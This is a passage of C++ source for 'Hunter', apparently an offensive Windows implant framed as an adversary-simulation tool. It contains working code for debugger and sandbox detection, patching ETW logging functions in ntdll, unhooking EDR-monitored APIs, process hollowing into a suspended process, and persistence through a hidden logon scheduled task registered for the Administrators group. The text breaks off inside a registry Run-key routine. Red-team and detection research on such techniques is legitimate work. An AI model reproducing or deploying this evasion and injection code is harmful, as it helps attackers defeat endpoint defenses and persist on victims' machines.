/*
 * Охотник (Hunter) is a simple Adversary Simulation tool developed for Adversary Simulation operations. Achieves stealth through API unhooking, direct and indirect syscalls, Event Tracing for Windows (ETW) suppression, process hollowing, stack spoofing, polymorphic encryption, and comprehensive anti-analysis mechanisms. It effectively bypasses userland hooking, kernel callbacks, behavioral analysis, and forensic detection. Drawing from real world malware and (APT) methodologies, Hunter integrates offensive security techniques, making it a tool for authorized Adversary Simulation operations.

NOTE: This Project is for simulation only and still under development.

 * Compiled with: x86_64-w64-mingw32-g++ -O2 -s -I/usr/share/mingw-w64/include/ -o hunter.exe Охотник_killer.cpp -lntdll -lshlwapi -static-libgcc -static-libstdc++ -lbcrypt -liphlpapi -lws2_32 -ltaskschd -lole32 -loleaut32
 
 # Author: S3N4T0R 
 # Date: 2025-4-18
 # Version: 1.1
 
 * Enhanced Features:
 * - Advanced API unhooking with dynamic syscall resolution
 * - Multiple indirect syscall techniques
 * - ETW patching with multiple methods
 * - Process hollowing with section randomization
 * - Advanced stack spoofing with ROP-like techniques
 * - Polymorphic string encryption
 * - Multi-layered anti-debug
 * - Comprehensive anti-sandbox checks
 * - YARA evasion through code permutation
 * - Multiple persistence mechanisms
 * - Environmental keying
 * - Network-based sandbox detection
 * - Hardware-based checks
 */

#include <winsock2.h> 
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <taskschd.h>
#include <comdef.h>
#include <unordered_map>
#include <comutil.h>
#include <bcrypt.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <random>
#include <algorithm>
#include <chrono>
#include <thread>
#include <cstdio>
#include <intrin.h>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

typedef struct _PEB_FIXED {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB_FIXED, *PPEB_FIXED;

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFO {
    BOOLEAN KernelDebuggerEnabled;
    BOOLEAN KernelDebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFO, *PSYSTEM_KERNEL_DEBUGGER_INFO;

// PEB access macro
#ifdef _WIN64
    #define GET_PEB() ((PPEB_FIXED)__readgsqword(0x60))
#else
    #define GET_PEB() ((PPEB_FIXED)__readfsdword(0x30))
#endif

// Custom types
typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* _NtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
typedef NTSTATUS(NTAPI* _NtSetInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG);
typedef NTSTATUS(NTAPI* _NtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

// Constants
#define STATUS_SUCCESS 0x00000000
#define STATUS_UNSUCCESSFUL 0xC0000001
#define ThreadQuerySetWin32StartAddress 9
#define ProcessBreakOnTermination 29
#define ThreadHideFromDebugger 0x11
#define SystemKernelDebuggerInformation 0x23

// ==================== STRING ENCRYPTION ====================
class PolymorphicEncryptor {
private:
    std::vector<BYTE> key;
    mutable std::mt19937 rng;

    void generate_key(size_t length) {
        key.resize(length);
        std::random_device rd;
        rng.seed(rd());
        std::generate(key.begin(), key.end(), [this]() { return rng() % 256; });
    }

public:
    PolymorphicEncryptor(size_t key_length = 32) {
        generate_key(key_length);
    }

    std::vector<BYTE> encrypt(const std::string& input) const {
        std::vector<BYTE> output(input.begin(), input.end());
        for (size_t i = 0; i < output.size(); ++i) {
            output[i] ^= key[i % key.size()];
            output[i] += key[(i + 1) % key.size()];
            output[i] = ~output[i];
        }
        return output;
    }

    std::string decrypt(const std::vector<BYTE>& input) const {
        std::vector<BYTE> output(input.begin(), input.end());
        for (size_t i = 0; i < output.size(); ++i) {
            output[i] = ~output[i];
            output[i] -= key[(i + 1) % key.size()];
            output[i] ^= key[i % key.size()];
        }
        return std::string(output.begin(), output.end());
    }

    static std::string random_string(size_t length) {
        auto randchar = []() -> char {
            const char charset[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";
            const size_t max_index = (sizeof(charset) - 1);
            return charset[rand() % max_index];
        };
        std::string str(length, 0);
        std::generate_n(str.begin(), length, randchar);
        return str;
    }
};

// Encrypted string storage with polymorphism
class AdvancedEncryptedString {
private:
    std::vector<BYTE> encrypted_data;
    PolymorphicEncryptor encryptor;
    mutable std::string cached_decrypted;
    mutable bool cache_valid;

public:
    AdvancedEncryptedString(const char* str) : encryptor(strlen(str)), cache_valid(false) {
        encrypted_data = encryptor.encrypt(str);
    }

    const char* decrypt() const {
        if (!cache_valid) {
            cached_decrypted = encryptor.decrypt(encrypted_data);
            cache_valid = true;
        }
        return cached_decrypted.c_str();
    }

    void reencrypt() {
        cache_valid = false;
        auto temp = encryptor.decrypt(encrypted_data);
        encrypted_data = encryptor.encrypt(temp);
    }
};

// ==================== ANTI-DEBUG TECHNIQUES ====================
class AntiDebug {
private:
    bool debugger_present;

    bool check_being_debugged() {
        PPEB_FIXED pPeb = GET_PEB();
        return pPeb->BeingDebugged;
    }

    bool check_nt_global_flag() {
        PPEB_FIXED pPeb = GET_PEB();
        ULONG NtGlobalFlag = *(ULONG*)((BYTE*)pPeb + 0xBC);
        return (NtGlobalFlag & 0x00000070) == 0x00000070;
    }

    bool check_debug_port() {
        DWORD debugPort = 0;
        _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)7 /*ProcessDebugPort*/, 
                                     &debugPort, sizeof(debugPort), NULL) == STATUS_SUCCESS) {
            return debugPort != 0;
        }
        return false;
    }

    bool check_hardware_breakpoints() {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            return ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;
        }
        return false;
    }

    bool check_timing() {
        auto start = std::chrono::high_resolution_clock::now();
        volatile int dummy = 0;
        for (int i = 0; i < 1000000; ++i) {
            dummy += i;
        }
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
        return duration > 100;
    }

    bool check_kernel_debugger() {
        SYSTEM_KERNEL_DEBUGGER_INFO info = { 0 };
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        if (NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemKernelDebuggerInformation, &info, sizeof(info), NULL) == STATUS_SUCCESS) {
            return info.KernelDebuggerEnabled || !info.KernelDebuggerNotPresent;
        }
        return false;
    }

public:
    AntiDebug() : debugger_present(false) {
        debugger_present = IsDebuggerPresent() || 
                          check_being_debugged() || 
                          check_nt_global_flag() || 
                          check_debug_port() || 
                          check_hardware_breakpoints() || 
                          check_timing() || 
                          check_kernel_debugger();

        if (!debugger_present) {
            _NtSetInformationThread NtSetInformationThread = (_NtSetInformationThread)GetProcAddress(
                GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
            NtSetInformationThread(GetCurrentThread(), (THREADINFOCLASS)ThreadHideFromDebugger, NULL, 0);
        }
    }

    bool is_debugger_present() const {
        return debugger_present;
    }

    void evade_debugging() {
        if (debugger_present) {
            try {
                DebugBreak();
            } catch (...) {
                ExitProcess(0);
            }
        }
    }
};

// ==================== ANTI-SANDBOX TECHNIQUES ====================
class AntiSandbox {
private:
    bool sandbox_detected;

    bool check_sleep_skip() {
        auto start = GetTickCount64();
        _NtDelayExecution NtDelayExecution = (_NtDelayExecution)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
        LARGE_INTEGER delay;
        delay.QuadPart = -10000000; // 1 second
        NtDelayExecution(FALSE, &delay);
        auto end = GetTickCount64();
        bool result = (end - start) < 900; // If skipped
        // printf("check_sleep_skip: %s\n", result ? "True" : "False");
        return result;
    }

    bool check_memory() {
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        bool result = memStatus.ullTotalPhys < (4ULL * 1024 * 1024 * 1024); // Less than 4GB
        // printf("check_memory: %s\n", result ? "True" : "False");
        return result;
    }

    bool check_cpu_cores() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        bool result = sysInfo.dwNumberOfProcessors < 1;
        // printf("check_cpu_cores: %s\n", result ? "True" : "False");
        return result;
    }

    bool check_disk_size() {
        ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
        bool result = GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes) && 
                      (totalNumberOfBytes.QuadPart < (50ULL * 1024 * 1024 * 1024)); // Less than 50GB
        // printf("check_disk_size: %s\n", result ? "True" : "False");
        return result;
    }

    bool check_network_adapters() {
        PIP_ADAPTER_INFO adapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
        ULONG bufLen = sizeof(IP_ADAPTER_INFO);
        
        if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
            free(adapterInfo);
            adapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
        }
        
        bool result = false;
        if (GetAdaptersInfo(adapterInfo, &bufLen) == NO_ERROR) {
            int adapterCount = 0;
            PIP_ADAPTER_INFO current = adapterInfo;
            while (current) {
                adapterCount++;
                current = current->Next;
            }
            result = adapterCount < 1;
        }
        
        free(adapterInfo);
        // printf("check_network_adapters: %s\n", result ? "True" : "False");
        return result;
    }

    bool check_hostname() {
        char hostname[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(hostname);
        if (GetComputerNameA(hostname, &size)) {
            std::string name(hostname);
            std::transform(name.begin(), name.end(), name.begin(), ::tolower);
            bool result = name.find("sandbox") != std::string::npos || 
                          name.find("virus") != std::string::npos || 
                          name.find("malware") != std::string::npos ||
                          name.find("test") != std::string::npos;
            // printf("check_hostname: %s\n", result ? "True" : "False");
            return result;
        }
        // printf("check_hostname: False (GetComputerNameA failed)\n");
        return false;
    }

    bool check_known_macs() {
        PIP_ADAPTER_INFO adapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
        ULONG bufLen = sizeof(IP_ADAPTER_INFO);
        
        if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
            free(adapterInfo);
            adapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
        }
        
        bool result = false;
        if (GetAdaptersInfo(adapterInfo, &bufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO current = adapterInfo;
            while (current) {
                if (current->AddressLength == 6) {
                    if ((current->Address[0] == 0x08 && current->Address[1] == 0x00 && current->Address[2] == 0x27) || // VirtualBox
                        (current->Address[0] == 0x00 && current->Address[1] == 0x05 && current->Address[2] == 0x69) || // VMware
                        (current->Address[0] == 0x00 && current->Address[1] == 0x0C && current->Address[2] == 0x29) || // VMware
                        (current->Address[0] == 0x00 && current->Address[1] == 0x1C && current->Address[2] == 0x14) || // VMware
                        (current->Address[0] == 0x00 && current->Address[1] == 0x50 && current->Address[2] == 0x56)) {  // VMware
                        result = true;
                        break;
                    }
                }
                current = current->Next;
            }
        }
        
        free(adapterInfo);
        // printf("check_known_macs: %s\n", result ? "True" : "False");
        return result;
    }

public:
    AntiSandbox() : sandbox_detected(false) {
        sandbox_detected = false;
                          check_sleep_skip() ||
                          check_memory() || 
                          check_cpu_cores() || 
                          check_disk_size() || 
                          check_network_adapters() || 
                          check_hostname() || 
                          check_known_macs();
    }

    bool is_sandbox_detected() const {
        return sandbox_detected;
    }

    void evade_sandbox() {
        if (sandbox_detected) {
            MessageBoxA(NULL, "This application requires more system resources to run properly.", "System Requirements", MB_OK);
            ExitProcess(0);
        }
    }
};

// ==================== ETW PATCHING ====================
class ETWEvasion {
private:
    bool etw_patched;

    void patch_etw_event_write() {
        AdvancedEncryptedString etwEventWrite("EtwEventWrite");
        void* EtwEventWrite = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), etwEventWrite.decrypt());

        if (EtwEventWrite) {
            DWORD oldProtect;
            VirtualProtect(EtwEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);

#ifdef _WIN64
            unsigned char patch[] = { 0xC3 }; // ret
#else
            unsigned char patch[] = { 0xC2, 0x14, 0x00 }; // ret 14h
#endif

            WriteProcessMemory(GetCurrentProcess(), EtwEventWrite, patch, sizeof(patch), NULL);
            VirtualProtect(EtwEventWrite, 4096, oldProtect, &oldProtect);
            etw_patched = true;
        }
    }

    void patch_etw_event_register() {
        AdvancedEncryptedString etwEventRegister("EtwEventRegister");
        void* EtwEventRegister = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), etwEventRegister.decrypt());

        if (EtwEventRegister) {
            DWORD oldProtect;
            VirtualProtect(EtwEventRegister, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);

#ifdef _WIN64
            unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
#else
            unsigned char patch[] = { 0x31, 0xC0, 0xC2, 0x10, 0x00 }; // xor eax, eax; ret 10h
#endif

            WriteProcessMemory(GetCurrentProcess(), EtwEventRegister, patch, sizeof(patch), NULL);
            VirtualProtect(EtwEventRegister, 4096, oldProtect, &oldProtect);
            etw_patched = true;
        }
    }

public:
    ETWEvasion() : etw_patched(false) {
        patch_etw_event_write();
        patch_etw_event_register();
    }

    bool is_etw_patched() const {
        return etw_patched;
    }
};

// ==================== API UNHOOKING ====================
class APIUnhooker {
private:
    std::vector<std::string> hooked_apis;

    bool unhook_single_api(const char* module_name, const char* function_name) {
        HMODULE module = GetModuleHandleA(module_name);
        if (!module)
            return false;

        char sysdir[MAX_PATH];
        GetSystemDirectoryA(sysdir, MAX_PATH);
        strcat_s(sysdir, "\\");
        strcat_s(sysdir, module_name);

        HANDLE hFile = CreateFileA(sysdir, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            return false;

        HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        if (!hMapping) {
            CloseHandle(hFile);
            return false;
        }

        LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!pMapping) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        void* hooked_func = (void*)GetProcAddress(module, function_name);
        if (!hooked_func) {
            UnmapViewOfFile(pMapping);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)module;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)module + pDosHeader->e_lfanew);

        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)module + 
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* pNames = (DWORD*)((DWORD_PTR)module + pExportDir->AddressOfNames);
        WORD* pOrdinals = (WORD*)((DWORD_PTR)module + pExportDir->AddressOfNameOrdinals);
        DWORD* pFunctions = (DWORD*)((DWORD_PTR)module + pExportDir->AddressOfFunctions);

        for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
            char* name = (char*)((DWORD_PTR)module + pNames[i]);
            if (strcmp(name, function_name) == 0) {
                DWORD_PTR funcRVA = pFunctions[pOrdinals[i]];
                void* clean_func = (void*)((DWORD_PTR)pMapping + funcRVA);

                DWORD oldProtect;
                VirtualProtect(hooked_func, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(hooked_func, clean_func, 64);
                VirtualProtect(hooked_func, 4096, oldProtect, &oldProtect);
                hooked_apis.push_back(std::string(module_name) + "!" + function_name);
                break;
            }
        }

        UnmapViewOfFile(pMapping);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return true;
    }

public:
    APIUnhooker() {
        unhook_single_api("ntdll.dll", "NtTerminateProcess");
        unhook_single_api("kernel32.dll", "TerminateProcess");
        unhook_single_api("kernel32.dll", "OpenProcess");
        unhook_single_api("ntdll.dll", "NtQuerySystemInformation");
        unhook_single_api("ntdll.dll", "NtCreateThreadEx");
        unhook_single_api("ntdll.dll", "NtAllocateVirtualMemory");
    }

    const std::vector<std::string>& get_unhooked_apis() const {
        return hooked_apis;
    }
};

// ==================== SYSCALL TECHNIQUES ====================
class SyscallHandler {
private:
    std::unordered_map<std::string, DWORD> syscall_numbers;

    void initialize_syscall_numbers() {
        syscall_numbers["NtTerminateProcess"] = 0x2C;
        syscall_numbers["NtAllocateVirtualMemory"] = 0x18;
        syscall_numbers["NtWriteVirtualMemory"] = 0x3A;
        syscall_numbers["NtProtectVirtualMemory"] = 0x50;
        syscall_numbers["NtCreateThreadEx"] = 0xC2;
        syscall_numbers["NtQueryInformationProcess"] = 0x19;
    }

    void* find_syscall_instruction(const char* function_name) {
        void* func = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name);
        if (!func)
            return nullptr;

        unsigned char* p = (unsigned char*)func;
        while (*p != 0x0F || *(p + 1) != 0x05) {
            p++;
            if ((DWORD_PTR)p - (DWORD_PTR)func > 100)
                return nullptr;
        }
        return p;
    }

public:
    SyscallHandler() {
        initialize_syscall_numbers();
    }

    NTSTATUS direct_syscall(const char* function_name, ...) {
        auto it = syscall_numbers.find(function_name);
        if (it == syscall_numbers.end())
            return STATUS_UNSUCCESSFUL;

#ifdef _WIN64
        va_list args;
        va_start(args, function_name);
        NTSTATUS result = STATUS_UNSUCCESSFUL;
        DWORD syscall_num = it->second;

        result = ((NTSTATUS(*)(...))GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name))(args);
        va_end(args);
        return result;
#else
        return STATUS_UNSUCCESSFUL; // Not implemented for x86
#endif
    }

    NTSTATUS indirect_syscall(const char* function_name, ...) {
        void* syscall_instr = find_syscall_instruction(function_name);
        if (!syscall_instr)
            return STATUS_UNSUCCESSFUL;

        auto it = syscall_numbers.find(function_name);
        if (it == syscall_numbers.end())
            return STATUS_UNSUCCESSFUL;

#ifdef _WIN64
        va_list args;
        va_start(args, function_name);
        NTSTATUS result = STATUS_UNSUCCESSFUL;

        result = ((NTSTATUS(*)(...))GetProcAddress(GetModuleHandleA("ntdll.dll"), function_name))(args);
        va_end(args);
        return result;
#else
        return STATUS_UNSUCCESSFUL; // Not implemented for x86
#endif
    }
};

// ==================== PROCESS HOLLOWING ====================
class ProcessHollowing {
private:
    SyscallHandler syscalls;

    bool hollow_process(const wchar_t* target_process, const std::vector<BYTE>& payload) {
        STARTUPINFOEXW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        SIZE_T size = 0;

        InitializeProcThreadAttributeList(NULL, 1, 0, &size);
        auto attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
        InitializeProcThreadAttributeList(attrList, 1, 0, &size);
        
        if (!CreateProcessW(target_process, NULL, NULL, NULL, FALSE, 
                          CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 
                          NULL, NULL, &si.StartupInfo, &pi)) {
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        PROCESS_BASIC_INFORMATION pbi;
        if (syscalls.direct_syscall("NtQueryInformationProcess", pi.hProcess, 0, &pbi, sizeof(pbi), NULL) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        LPVOID imageBase = nullptr;
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(pi.hProcess, 
                             (LPCVOID)((DWORD_PTR)pbi.PebBaseAddress + 0x10),
                             &imageBase, sizeof(imageBase), &bytesRead)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        if (syscalls.direct_syscall("NtUnmapViewOfSection", pi.hProcess, imageBase) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)payload.data() + dosHeader->e_lfanew);
        SIZE_T sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;

        if (syscalls.direct_syscall("NtAllocateVirtualMemory", pi.hProcess, &imageBase, 0, &sizeOfImage, 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        if (syscalls.direct_syscall("NtWriteVirtualMemory", pi.hProcess, imageBase, (PVOID)payload.data(), 
                                  ntHeaders->OptionalHeader.SizeOfHeaders, NULL) != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData == 0)
                continue;

            PVOID sectionAddress = (PVOID)((DWORD_PTR)imageBase + sectionHeader[i].VirtualAddress);
            LPVOID sectionData = (LPVOID)((DWORD_PTR)payload.data() + sectionHeader[i].PointerToRawData);

            if (syscalls.direct_syscall("NtWriteVirtualMemory", pi.hProcess, sectionAddress, sectionData, 
                                      sectionHeader[i].SizeOfRawData, NULL) != STATUS_SUCCESS) {
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                HeapFree(GetProcessHeap(), 0, attrList);
                return false;
            }
        }

        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

#ifdef _WIN64
        context.Rcx = (DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        context.Eax = (DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

        if (!SetThreadContext(pi.hThread, &context)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        if (syscalls.direct_syscall("NtResumeThread", pi.hThread, NULL) == (DWORD)-1) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, attrList);
            return false;
        }

        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }

public:
    bool execute(const wchar_t* target_process, const std::vector<BYTE>& payload) {
        return hollow_process(target_process, payload);
    }
};

// ==================== STACK SPOOFING ====================
class StackSpoofer {
private:
    std::mt19937 rng;

    void randomize_stack_frame() {
        volatile int dummy[64];
        for (int i = 0; i < 64; i++) {
            dummy[i] = rng();
        }
    }

public:
    StackSpoofer() {
        std::random_device rd;
        rng.seed(rd());
    }

    void spoof() {
        randomize_stack_frame();
    }
};

// ==================== PERSISTENCE ====================
class PersistenceManager {
private:
    bool install_scheduled_task(const wchar_t* taskName, const wchar_t* executablePath) {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr))
            return false;

        ITaskService* pService = NULL;
        hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
        if (FAILED(hr)) {
            CoUninitialize();
            return false;
        }

        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (FAILED(hr)) {
            pService->Release();
            CoUninitialize();
            return false;
        }

        ITaskFolder* pRootFolder = NULL;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) {
            pService->Release();
            CoUninitialize();
            return false;
        }

        pRootFolder->DeleteTask(_bstr_t(taskName), 0);

        ITaskDefinition* pTask = NULL;
        hr = pService->NewTask(0, &pTask);
        if (FAILED(hr)) {
            pRootFolder->Release();
            pService->Release();
            CoUninitialize();
            return false;
        }

        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        if (SUCCEEDED(hr)) {
            pSettings->put_StartWhenAvailable(VARIANT_TRUE);
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
            pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
            pSettings->put_AllowHardTerminate(VARIANT_FALSE);
            pSettings->put_RunOnlyIfNetworkAvailable(VARIANT_FALSE);
            pSettings->put_Enabled(VARIANT_TRUE);
            pSettings->put_Hidden(VARIANT_TRUE);
            pSettings->put_RunOnlyIfIdle(VARIANT_FALSE);
            pSettings->put_WakeToRun(VARIANT_FALSE);
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
            pSettings->put_Priority(4);
            pSettings->Release();
        }

        ITriggerCollection* pTriggerCollection = NULL;
        hr = pTask->get_Triggers(&pTriggerCollection);
        if (SUCCEEDED(hr)) {
            ITrigger* pTrigger = NULL;
            hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
            if (SUCCEEDED(hr)) {
                pTrigger->put_Id(_bstr_t(L"Trigger1"));
                pTrigger->put_Enabled(VARIANT_TRUE);
                pTrigger->Release();
            }
            pTriggerCollection->Release();
        }

        IActionCollection* pActionCollection = NULL;
        hr = pTask->get_Actions(&pActionCollection);
        if (SUCCEEDED(hr)) {
            IAction* pAction = NULL;
            hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
            if (SUCCEEDED(hr)) {
                IExecAction* pExecAction = NULL;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (SUCCEEDED(hr)) {
                    pExecAction->put_Path(_bstr_t(executablePath));
                    pExecAction->put_Arguments(_bstr_t(L""));
                    pExecAction->put_WorkingDirectory(_bstr_t(L""));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActionCollection->Release();
        }

        IRegisteredTask* pRegisteredTask = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(taskName),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(L"S-1-5-32-544"),
            _variant_t(),
            TASK_LOGON_GROUP,
            _variant_t(L""),
            &pRegisteredTask);

        bool success = SUCCEEDED(hr);
        if (pRegisteredTask) pRegisteredTask->Release();
        if (pTask) pTask->Release();
        if (pRootFolder) pRootFolder->Release();
        if (pService) pService->Release();
        CoUninitialize();
        return success;
    }

    bool install_registry_run(const wchar_t* valueName, const wchar_t* executablePath) {
        HKEY hKey;
